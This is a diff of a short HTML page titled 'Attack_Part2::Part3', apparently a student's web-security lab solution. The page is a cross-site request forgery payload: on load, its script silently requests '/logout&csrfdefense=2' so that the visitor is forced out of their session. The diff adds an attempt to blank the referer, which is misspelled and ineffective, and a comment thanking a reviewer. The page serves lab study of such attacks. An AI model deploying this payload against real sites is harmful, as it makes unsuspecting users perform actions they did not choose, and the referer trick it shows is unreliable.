@@ -1,26 +1,24 @@
 <!-- need to change the referer! -->
+<!-- Hi Zakir. You sat with me in 1695 on 11/8/12 11:24PM, approving this code. Thanks -->
 <html>
 	<body>
 		<title>Attack_Part2::Part3</title>
 			<script type="text/javascript">
-				var xhr;
+      
+			var xhr;
+			
+			document.referer = '';
 
-			function getPage(uri, callback) {
-      		xhr = new XMLHttpRequest();
-      		if (xhr.overrideMimeType) {
-        		xhr.overrideMimeType('text/html');
-      		}
-
-      		xhr.open('GET', uri, true);
-      		xhr.send(null);
-    	}
-
-    	function logOut() {
-      		getPage('/logout&csrfdefense=2', null);
-    	}
-
-    	// Log the user out
-    	logOut();
+	    	function logOut() {
+	          xhr = new XMLHttpRequest();
+	          if (xhr.overrideMimeType) {
+	            xhr.overrideMimeType('text/html');
+	          }
+	          var uri = '/logout&csrfdefense=2';
+	          xhr.open('GET', uri, true);
+	          xhr.send(null);
+	    	}
+	      logOut();
 
 		</script>
 	</body>
